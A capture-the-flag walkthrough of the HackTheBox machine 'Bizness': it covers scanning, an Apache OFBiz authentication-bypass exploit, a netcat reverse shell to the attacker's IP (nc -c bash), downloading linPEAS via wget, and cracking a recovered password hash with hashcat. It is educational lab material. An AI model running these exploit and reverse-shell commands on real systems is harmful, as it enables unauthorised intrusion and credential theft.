---
description: Walkthrough of the HTB machine "Bizness"
cover: >-
  https://images.unsplash.com/photo-1496442226666-8d4d0e62e6e9?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHwyfHxuZXclMjB5b3JrfGVufDB8fHx8MTcwOTM4NzQzOXww&ixlib=rb-4.0.3&q=85
coverY: 0
---

# 👩‍💼 Bizness (10.10.11.252)

## Scanning

Let's start with the usual Nmap scan:

```bash
nmap -T4 -A 10.10.11.252    

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-02 10:59 -03
Nmap scan report for 10.10.11.252
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.59 seconds

```

As we can see, HTTP and HTTPS are opened on the target. However, when we try to access it via a web browser, we're redirected to the domain "_bizness.htb_".

So, we need to put this domain into our /etc/hosts file:

```bash
echo '10.10.11.152 bizness.htb' | sudo tee -a /etc/hosts
```



## Enumeration

As we navigate through the website, we can start up a Directory Busting tool as well as a Subdomain Finder while we analyze the application.

There is a variety of tools we can use for Directory Busting, being: _gobuster, dirbuster, feroxbuster, FFUF_, etc.

In this case, we're going to Directory Bust using _Dirbuster_:

```bash
dirbuster -u https://bizness.htb/ -l /usr/share/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt 

# -u = url
# -l = wordlist
```

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption><p>Dirbuster found a login page</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption><p>Login page</p></figcaption></figure>



## Exploitation

Once we found a login page, we can try default credentials or brute-forcing this if we're able. However, first, let's try searching for an exploit for this OFBiz Apache page.

After some research, I found that [CVE-2023-51467](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) relates to an Authentication Bypass Vulnerability in Apache OFBiz. This CVE exploits a Server-Side Request Forgery (SSRF) vulnerability on the web application. We can download the exploit file and run it on our target:

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption><p>Exploit showing that target is vulnerable</p></figcaption></figure>

Now we can run commands on the target. So we can try to get a Reverse Shell using _Netcat_:

<pre class="language-bash"><code class="lang-bash"><strong>#First, we should open a port with Netcat
</strong><strong>
</strong><strong>rlwrap nc -nvlp 7777
</strong><strong>#rlwrap is used so we can have a better tty shell.
</strong><strong>
</strong><strong>#Next, we should execute the exploit to get the Reverse Shell
</strong><strong>python3 exploit.py --url https://bizness.htb/ --cmd 'nc 10.10.14.19 7777'
</strong></code></pre>

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption><p>Exploit first try</p></figcaption></figure>

However, as we can see here, we aren't getting any responses from the server despite providing commands through Netcat.

We can fix this by adding a `-c bash` to the command:&#x20;

```bash
python3 exploit.py --url https://bizness.htb/ --cmd 'nc -c bash 10.10.14.19 7777'

# -c = specifies shell commands to execute after a connection. In this case, we're specifying we want to use bash
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption><p>Exploit Successful</p></figcaption></figure>



### User Flag

From there, we just need to grab the user flag in the "_ofbiz_" home directory:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption><p>User flag</p></figcaption></figure>

Now, before we do anything else, let's get a full TTY Shell. The best way to do this is using this Python script:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

However, I'm going to leave you [this link](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys) so you can find other ways to get a Full TTY Shell.



## Post Exploitation / Privilege Escalation

We can start by doing some basic enumeration. After that, if we aren't able to find anything from the get-go, we can upload "_linPEAS_" to the target by using the following commands:

<pre class="language-bash"><code class="lang-bash"><strong># On the ATTACKER machine, go to the folder where you have linPEAS (if you're in Kali Linux version 2024.1, it should be in your /opt/linpeas folder:
</strong><strong>
</strong><strong>cd /opt/linpeas
</strong><strong>
</strong><strong>python3 -m http.server 80
</strong><strong>
</strong><strong>
</strong><strong># On the TARGET machine, go to the "tmp" folder, where we usually have write access and download the "linpeas.sh" file using wget:
</strong><strong>
</strong><strong>cd /tmp
</strong><strong>
</strong><strong>wget http://&#x3C;attacker ip>/linpeas.sh
</strong><strong>
</strong><strong># Next, we give the script permission to execute:
</strong><strong>
</strong><strong>chmod +x linpeas.sh
</strong><strong>
</strong><strong># Then, we run the script:
</strong><strong>
</strong><strong>./linpeas.sh
</strong></code></pre>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption><p>Transfering linPEAS to the target machine</p></figcaption></figure>

LinPEAS shows us that there's an executable our user has write access to:

<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption><p>LinPEAS shows an executable file our low level user has write access to</p></figcaption></figure>

However, we can only abuse this to create a backdoor. [This link](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services) should provide you with an explanation.

So we'll need to enumerate further.

If we continue our enumeration, we'll be able to find a password in the `c54d0.dat` file located in the `/opt/ofbiz/runtime/data/derby/ofbiz/seg0` directory:

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption><p>SALT part of the hash</p></figcaption></figure>

Now, before we crack this hash, [we'll need to decode the hash](https://www.linkedin.com/pulse/bizness-htb-walkthrough-laith-younes-laith-younes--jtqhe) using [CyberChef](https://gchq.github.io/CyberChef/#recipe=Find\_/\_Replace\(%7B'option':'Regex','string':'\_'%7D,'/',false,false,false,false\)Find\_/\_Replace\(%7B'option':'Regex','string':'-'%7D,'%2B',false,false,false,false\)From\_Base64\('A-Za-z0-9%2B/%3D',false,false\)To\_Hex\('None',0\)\&input=dVAwX1FhVkJwRFdGZW84LWRSekRxUndYUTJJ):

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption><p>Decoded hash</p></figcaption></figure>

So we can use "_hashcat_" with the hash mode of 120 to crack it:

```bash
hashcat -m 120 '<hash>:d' /usr/share/wordlists/rockyou.txt

# -m = mode
```

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption><p>Here's our cracked password</p></figcaption></figure>

###

### Root Flag

Now we just need to switch the user to root and grab the root flag:

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption><p>Root's Flag</p></figcaption></figure>

And this was the CTF!&#x20;

Thank you so much for taking the time to read my WriteUp!

See you in another box!
